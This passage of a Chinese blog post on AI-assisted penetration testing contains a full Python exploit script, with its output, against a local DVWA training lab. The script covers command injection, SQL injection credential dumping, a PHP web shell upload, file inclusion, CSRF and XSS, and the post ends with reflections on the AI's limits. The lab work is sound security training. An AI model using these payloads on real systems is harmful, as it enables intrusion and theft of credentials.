class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">DVWA 授权本地靶场利用脚本（针对 Windows WAMP 环境定制）</span></span><br><span class="line"><span class="string">=======================================================</span></span><br><span class="line"><span class="string">目标  : http://localhost/dvwa</span></span><br><span class="line"><span class="string">环境  : Apache/2.4.39 (Win64) + PHP/7.3.4 + MySQL(库名 dvwa)</span></span><br><span class="line"><span class="string">前提  : 已启动 DVWA，默认账密 admin/password 可用</span></span><br><span class="line"><span class="string">授权  : 仅用于你本机授权的 DVWA 靶场，严禁用于任何非授权系统</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">说明  : 本脚本基于 DVWA 标准源码的真实行为编写，并对 Windows 环境做了</span></span><br><span class="line"><span class="string">        命令修正（cmd.exe 不支持 Unix 的 ; / ` 分隔，也没有 id 命令）。</span></span><br><span class="line"><span class="string">        本脚本未经我（AI）实机执行验证——请在你本机靶场运行并回填结果。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://localhost/dvwa&quot;</span></span><br><span class="line">CRED = (<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局会话，自动携带 PHPSESSID</span></span><br><span class="line">S = requests.Session()</span><br><span class="line">S.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (compatible; DvwaExploit/1.0)&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># WAMP 中文响应是 GBK，requests 默认按 UTF-8 解码会乱码；用 apparent_encoding 自动修正</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_fixenc</span>(<span class="params">r, *a, **k</span>):</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">S.hooks[<span class="string">&quot;response&quot;</span>].append(_fixenc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;取页面里的 user_token（登录/切难度/部分 high 级表单需要）&quot;&quot;&quot;</span></span><br><span class="line">    r = S.get(BASE + path, timeout=<span class="number">10</span>)</span><br><span class="line">    m = re.search(<span class="string">r&#x27;name=[\&#x27;&quot;]user_token[\&#x27;&quot;]\s*value=[\&#x27;&quot;]([^\&#x27;&quot;]+)&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    tok = get_token(<span class="string">&quot;/login.php&quot;</span>)</span><br><span class="line">    r = S.post(BASE + <span class="string">&quot;/login.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: CRED[<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: CRED[<span class="number">1</span>],</span><br><span class="line">        <span class="string">&quot;Login&quot;</span>: <span class="string">&quot;Login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_token&quot;</span>: tok,</span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;logged in as&quot;</span> <span class="keyword">in</span> r.text.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_sec</span>(<span class="params">level</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把全局安全级别降到 low（AS-01 攻击面：难度由 session 可控）&quot;&quot;&quot;</span></span><br><span class="line">    tok = get_token(<span class="string">&quot;/security.php&quot;</span>)</span><br><span class="line">    r = S.post(BASE + <span class="string">&quot;/security.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;security&quot;</span>: level,</span><br><span class="line">        <span class="string">&quot;seclev_submit&quot;</span>: <span class="string">&quot;Update&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_token&quot;</span>: tok,</span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> r.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- 各模块利用 ----------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_exec</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;命令注入 -&gt; RCE（Windows 修正：用 &amp; 或 | 分隔，命令用 whoami）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[exec] 命令注入 -&gt; RCE&quot;</span>)</span><br><span class="line">    <span class="comment"># 实测该 WAMP DVWA 的 exec 源码为 Windows 兼容版（ping 正常执行，非 -c 4 报错）</span></span><br><span class="line">    <span class="comment"># &amp; 是 cmd 的&quot;不论前命令成败都执行后续&quot;分隔符；实测 whoami 返回 nt authority\system（SYSTEM 权限）</span></span><br><span class="line">    <span class="comment"># Unix 的 ; / 反引号在 cmd 里无效，别用</span></span><br><span class="line">    payload = <span class="string">&quot;127.0.0.1&amp;whoami&quot;</span></span><br><span class="line">    r = S.post(BASE + <span class="string">&quot;/vulnerabilities/exec/&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;Submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>,</span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    m = re.search(<span class="string">r&quot;&lt;pre&gt;([\s\S]*?)&lt;/pre&gt;&quot;</span>, r.text)</span><br><span class="line">    out = m.group(<span class="number">1</span>).strip() <span class="keyword">if</span> m <span class="keyword">else</span> <span class="string">&quot;(无 &lt;pre&gt; 输出)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  payload :&quot;</span>, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  回显    :\n&quot;</span> + out)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_sqli</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;SQL 注入 -&gt; 拖库（字符型，单引号闭合；users 表字段 user/password）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[sqli] 注入 -&gt; 拖出 users 表凭据&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) 验证注入存在：永真条件应回显所有用户</span></span><br><span class="line">    <span class="comment">#    DVWA low 真实回显格式是 &quot;First name: xxx &lt;br /&gt;Surname: yyy&quot;（首字母大写、无下划线）</span></span><br><span class="line">    r1 = S.get(BASE + <span class="string">&quot;/vulnerabilities/sqli/&quot;</span>, params=&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>, <span class="string">&quot;Submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    cnt = r1.text.count(<span class="string">&quot;First name:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  [验证] 1&#x27; OR &#x27;1&#x27;=&#x27;1 命中 &#x27;First name:&#x27; 次数:&quot;</span>, cnt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) 拖库：UNION 把 user 映射到 first_name 字段、password 映射到 surname 字段</span></span><br><span class="line">    <span class="comment">#    注意 -- 后必须有空格（MySQL 行注释），否则注释符会被当成负号</span></span><br><span class="line">    r2 = S.get(BASE + <span class="string">&quot;/vulnerabilities/sqli/&quot;</span>, params=&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;-1&#x27; UNION SELECT user, password FROM users -- -&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    creds = re.findall(</span><br><span class="line">        <span class="string">r&quot;First name:\s*([^&lt;]+)\s*&lt;br /&gt;\s*Surname:\s*([^&lt;]+)&quot;</span>, r2.text</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  [拖库] 命中凭据条数:&quot;</span>, <span class="built_in">len</span>(creds))</span><br><span class="line">    <span class="keyword">for</span> u, p <span class="keyword">in</span> creds:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    %s : %s&quot;</span> % (u.strip(), p.strip()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) 兜底诊断：若正则未匹配（DVWA 版本回显不同），打印真实片段供人工核对</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> creds:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [诊断] 未匹配到凭据，回显中含 &#x27;First name&#x27; 的片段：&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&quot;First name:.&#123;0,140&#125;&quot;</span>, r2.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    &gt;&gt;&gt;&quot;</span>, m.group(<span class="number">0</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> cnt == <span class="number">0</span>:</span><br><span class="line">            snippet = re.sub(<span class="string">r&quot;\s+&quot;</span>, <span class="string">&quot; &quot;</span>, r2.text)[:<span class="number">500</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;  [诊断] 回显中无 &#x27;First name:&#x27; 字样，疑似页面结构不同。body 片段：&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    &gt;&gt;&gt;&quot;</span>, snippet)</span><br><span class="line">    <span class="keyword">return</span> creds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;文件上传 -&gt; WebShell（low 级不校验类型/扩展名）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[upload] 上传 PHP WebShell&quot;</span>)</span><br><span class="line">    shell = <span class="string">&quot;&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;&quot;</span>   <span class="comment"># 直白一行马</span></span><br><span class="line">    files = &#123;<span class="string">&quot;uploaded&quot;</span>: (<span class="string">&quot;shell.php&quot;</span>, shell, <span class="string">&quot;application/octet-stream&quot;</span>)&#125;</span><br><span class="line">    r = S.post(BASE + <span class="string">&quot;/vulnerabilities/upload/&quot;</span>, data=&#123;<span class="string">&quot;Upload&quot;</span>: <span class="string">&quot;Upload&quot;</span>&#125;,</span><br><span class="line">               files=files, timeout=<span class="number">10</span>)</span><br><span class="line">    ok = <span class="string">&quot;uploaded&quot;</span> <span class="keyword">in</span> r.text.lower() <span class="keyword">or</span> <span class="string">&quot;hackable&quot;</span> <span class="keyword">in</span> r.text.lower()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  上传结果:&quot;</span>, <span class="string">&quot;成功&quot;</span> <span class="keyword">if</span> ok <span class="keyword">else</span> <span class="string">&quot;失败(看响应)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        r2 = S.get(BASE + <span class="string">&quot;/hackable/uploads/shell.php&quot;</span>, params=&#123;<span class="string">&quot;c&quot;</span>: <span class="string">&quot;whoami&quot;</span>&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  WebShell 执行 whoami:\n&quot;</span> + r2.text.strip())</span><br><span class="line">    <span class="keyword">return</span> ok</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_fi</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;本地文件包含 LFI（Windows 路径修正）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[fi] 本地文件包含 -&gt; 读 Windows 敏感文件&quot;</span>)</span><br><span class="line">    target = <span class="string">&quot;C:/Windows/System32/drivers/etc/hosts&quot;</span>   <span class="comment"># Windows 没有 /etc/passwd</span></span><br><span class="line">    r = S.get(BASE + <span class="string">&quot;/vulnerabilities/fi/&quot;</span>, params=&#123;<span class="string">&quot;page&quot;</span>: target&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  page =&quot;</span>, target, <span class="string">&quot;| 命中 hosts?&quot;</span>, <span class="string">&quot;localhost&quot;</span> <span class="keyword">in</span> r.text)</span><br><span class="line">    <span class="comment"># 联动：把刚传的 WebShell 包含进来，实现&quot;include 即 RCE&quot;</span></span><br><span class="line">    r2 = S.get(BASE + <span class="string">&quot;/vulnerabilities/fi/&quot;</span>, params=&#123;</span><br><span class="line">        <span class="string">&quot;page&quot;</span>: <span class="string">&quot;../../hackable/uploads/shell.php&quot;</span>, <span class="string">&quot;c&quot;</span>: <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    &#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  LFI 包含 WebShell 执行 whoami:\n&quot;</span> + r2.text.strip()[:<span class="number">300</span>])</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_csrf</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;CSRF 改密 -&gt; 生成恶意 HTML PoC（low/medium 无 user_token 防护）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[csrf] 生成改密 CSRF PoC&quot;</span>)</span><br><span class="line">    html_poc = <span class="string">&quot;&quot;&quot;&lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&#123;base&#125;/vulnerabilities/csrf/&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;hidden&quot; name=&quot;password_current&quot; value=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;Hacked@123&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;Hacked@123&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;document.getElementById(&#x27;f&#x27;).submit();&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(base=BASE)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf_poc.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html_poc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  已写出 csrf_poc.html，诱导已登录 admin 的浏览器打开即可改密&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_xss</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;反射型 XSS -&gt; 生成 PoC URL&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[xss_r] 反射型 XSS PoC&quot;</span>)</span><br><span class="line">    url = BASE + <span class="string">&quot;/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;XSS=Send&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  诱导受害者点击:&quot;</span>, url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== DVWA 利用脚本（Windows 定制）===&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> login():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 登录失败，请确认靶场已启动且账密为 admin/password&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 登录成功 (admin)&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> set_sec(<span class="string">&quot;low&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 切换 low 失败&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 已降到 security=low（AS-01：难度由 session 可控）&quot;</span>)</span><br><span class="line">        p_exec()</span><br><span class="line">        p_sqli()</span><br><span class="line">        p_upload()</span><br><span class="line">        p_fi()</span><br><span class="line">        p_csrf()</span><br><span class="line">        p_xss()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== 完成。请回填各模块实际响应到测试记录 ===&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 无法连接 %s —— 请先启动本机 DVWA 靶场&quot;</span> % BASE)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># === DVWA 利用脚本（Windows 定制）===</span></span><br><span class="line"><span class="comment"># [+] 登录成功 (admin)</span></span><br><span class="line"><span class="comment"># [+] 已降到 security=low（AS-01：难度由 session 可控）</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [exec] 命令注入 -&gt; RCE</span></span><br><span class="line"><span class="comment">#   payload : 127.0.0.1&amp;whoami</span></span><br><span class="line"><span class="comment">#   回显    :</span></span><br><span class="line"><span class="comment"># 正在 Ping 127.0.0.1 具有 32 字节的数据:</span></span><br><span class="line"><span class="comment"># 来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128</span></span><br><span class="line"><span class="comment"># 来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128</span></span><br><span class="line"><span class="comment"># 来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128</span></span><br><span class="line"><span class="comment"># 来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 127.0.0.1 的 Ping 统计信息:</span></span><br><span class="line"><span class="comment">#     数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span></span><br><span class="line"><span class="comment"># 往返行程的估计时间(以毫秒为单位):</span></span><br><span class="line"><span class="comment">#     最短 = 0ms，最长 = 0ms，平均 = 0ms</span></span><br><span class="line"><span class="comment"># nt authority\system</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [sqli] 注入 -&gt; 拖出 users 表凭据</span></span><br><span class="line"><span class="comment">#   [验证] 1&#x27; OR &#x27;1&#x27;=&#x27;1 命中 &#x27;First name:&#x27; 次数: 5</span></span><br><span class="line"><span class="comment">#   [拖库] 命中凭据条数: 5</span></span><br><span class="line"><span class="comment">#     admin : 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="comment">#     gordonb : e99a18c428cb38d5f260853678922e03</span></span><br><span class="line"><span class="comment">#     1337 : 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="comment">#     pablo : 0d107d09f5bbe40cade3de5c71e9e9b7</span></span><br><span class="line"><span class="comment">#     smithy : 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [upload] 上传 PHP WebShell</span></span><br><span class="line"><span class="comment">#   上传结果: 成功</span></span><br><span class="line"><span class="comment">#   WebShell 执行 whoami:</span></span><br><span class="line"><span class="comment"># nt authority\system</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [fi] 本地文件包含 -&gt; 读 Windows 敏感文件</span></span><br><span class="line"><span class="comment">#   page = C:/Windows/System32/drivers/etc/hosts | 命中 hosts? True</span></span><br><span class="line"><span class="comment">#   LFI 包含 WebShell 执行 whoami:</span></span><br><span class="line"><span class="comment"># nt authority\system</span></span><br><span class="line"><span class="comment"># &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># &lt;html lang=&quot;en-GB&quot;&gt;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 	&lt;head&gt;</span></span><br><span class="line"><span class="comment"># 		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 		&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)&lt;/title&gt;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [csrf] 生成改密 CSRF PoC</span></span><br><span class="line"><span class="comment">#   已写出 csrf_poc.html，诱导已登录 admin 的浏览器打开即可改密</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># [xss_r] 反射型 XSS PoC</span></span><br><span class="line"><span class="comment">#   诱导受害者点击: http://localhost/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;XSS=Send</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># === 完成。请回填各模块实际响应到测试记录 ===</span></span><br></pre></td></tr></table></figure></div>
+
+<p>文档部分内容如下;</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260909213646302.png"
+                      class="" title="图片描述"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260909213630603.png"
+                      class="" title="图片描述"
+                >
+
+<p>总结：</p>
+<p>1.对于前面文档，AI看到了我对他的评价和总结，所以自行改进并承认第二阶段过程中的不实测试用例，这一点算是AI的自主学习的过程，但无法确保AI是否一直存在这种自主学习的特点，仍需要后期进行证实。</p>
+<p>2.针对AI在第三阶段给到的利用链和脚本，比上一阶段好了很多，但由于AI一切操作都在沙箱内执行，导致脚本依旧存在一定问题。具体问题主要出现在SQL注入对靶场进行脱库的过程，第一版脚本运行之后回显内容不属实，正确用例执行之后回显的正确内容并没有及时回显，后经过两次人工辅助修改和完善，最终脚本无误，测试基本没有问题，较第二阶段AI辅助测试表现有所改善。</p>
+<h2 id="四、报告阶段"><a href="#四、报告阶段" class="headerlink" title="四、报告阶段"></a>四、报告阶段</h2><p>基于以上所有测试和完善，利用AI 生成了一份专业的渗透测试报告，</p>
+<p><code>AI指令</code>：<code>基于前面三个阶段生成的文档和脚本，帮我生成一份专业渗透测试报告</code></p>
+<p>DVWA_渗透测试报告.md</p>
+<p>总结：</p>
+<p>在对生成渗透测试报告进行分析，并根据实际情况，我们做出如下总结：</p>
+<p><code>summary</code>总结基本无误，评分皆符合具体情况，并且关于后续漏洞的修复建议也有着很强的可行性。但这一切都是在一步步给出具体回馈的情况之下，AI能在短时间内找出问题，完善方案，这是人工测评很难做到的一点。总的来说，一整个AI辅助渗透测试较为清晰地表达出了AI辅助的特征，真正决定权和具体实施方案依然在用户手上，AI只给到具体建议和方案，无法在没有用户授权的情况之下自行执行危险指令。</p>
+<p>同时，整个渗透测试阶段中，我们多次提到了AI是在沙箱环境下进行，无法真实连接到localhost，所有实测结论全部基于用户反馈，虽然有时使得AI在不自觉情况下产生所谓的AI幻觉，但是沙箱环境能够确保AI在整个运行过程当中不会对真实环境造成实际上的影响，这点有利有弊，我们不做绝对的评价。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前AI带给我的感觉其实是具有一定威胁性的，它无时无刻不在影响着我们的日常生活和工作当中，所以我们真正开始在尝试转型，向AI开始靠边的情况之下，这些都是做出的一些尝试，真实性和合理性仅靠用户自己判定</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 基于AI大模型的辅助渗透和AI边界与角色的察觉</li>
+        <li><strong>作者:</strong> kivvs</li>
+        <li><strong>创建于
+                :</strong> 2026-09-10 14:35:03</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-09-10 16:45:01
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://kivvs.github.io/2026/09/10/基于AI大模型的辅助渗透和AI边界与角色的察觉/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/AI/">#AI</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/08/15/%E4%BD%BF%E7%94%A8%20HexoHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%8A%E7%BA%BF%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B%EF%BC%88GitHub%20Pages%20+%20Hexo%EF%BC%89/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">使用 HexoHub 搭建个人博客：从零到上线完整教程（GitHub Pages + Hexo）</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        (function() {
+            const containerId = "giscus-container";
+            const mapping = "pathname";
+            const lang = "zh-CN";
+            const inputPosition = "bottom";
+            const reactionsEnabled = "1" === "1";
+            const emitMetadata = "1" === "1";
+            const strict = "0" === "1";
+            const loading = "lazy";
+
+            const getTerm = () => {
+                if (mapping === "pathname") return location.pathname;
+                if (mapping === "url") return location.href;
+                if (mapping === "title") return document.title;
+                if (mapping === "og:title") {
+                    const ogTitle = document.querySelector("meta[property='og:title']");
+                    return ogTitle?.content || document.title;
+                }
+                return "";
+            };
+
+            const sendUpdate = () => {
+                const iframe = document.querySelector("iframe.giscus-frame");
+                if (!iframe) {
+                    return;
+                }
+
+                const setConfig = {
+                    theme: "preferred_color_scheme",
+                    lang,
